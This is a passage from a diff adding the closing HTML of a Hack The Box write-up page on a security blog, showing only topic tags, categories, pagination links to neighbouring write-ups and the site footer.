+      <a href="/tags/#brute-force" class="page__taxonomy-item" rel="tag">brute force</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#buffer-overflow" class="page__taxonomy-item" rel="tag">buffer overflow</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command injection</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ssfr" class="page__taxonomy-item" rel="tag">ssfr</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#xss" class="page__taxonomy-item" rel="tag">xss</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-03-07T00:00:00+01:00">March 07, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-zetta/" class="pagination--pager" title="Zetta - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-postman/" class="pagination--pager" title="Postman - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
